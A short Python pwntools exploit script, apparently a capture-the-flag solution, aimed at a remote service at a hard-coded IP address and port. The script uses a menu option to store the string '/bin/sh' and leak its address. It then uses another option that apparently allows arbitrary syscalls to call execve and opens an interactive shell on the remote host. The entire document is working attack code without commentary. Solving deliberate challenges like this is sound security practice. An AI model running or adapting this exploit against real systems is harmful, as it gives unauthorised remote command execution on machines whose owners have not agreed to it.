from pwn import *
context(arch="amd64", os="linux", log_level="debug")
s=remote("47.97.58.52",42010)
def menu(ch):
    s.sendlineafter(b"choice: ",str(ch).encode())

def add(data):
    menu(1)
    s.recvuntil(b"located at ")
    addr=int(s.recvline().strip(),16)
    s.sendafter(b"data: ",data)
    return addr

def exec_syscall(cnt,args):
    assert len(args)==cnt+1
    menu(3)
    s.sendlineafter(b"call: ",str(args[0]).encode())
    s.sendlineafter(b"count: ",str(cnt).encode())
    for i in range(cnt):
        s.sendlineafter(f"argument {i}: ".encode(),str(args[i+1]).encode())

if __name__ == "__main__":
    exec_syscall(3,[59,add("/bin/sh\x00"),0,0])
    s.interactive()
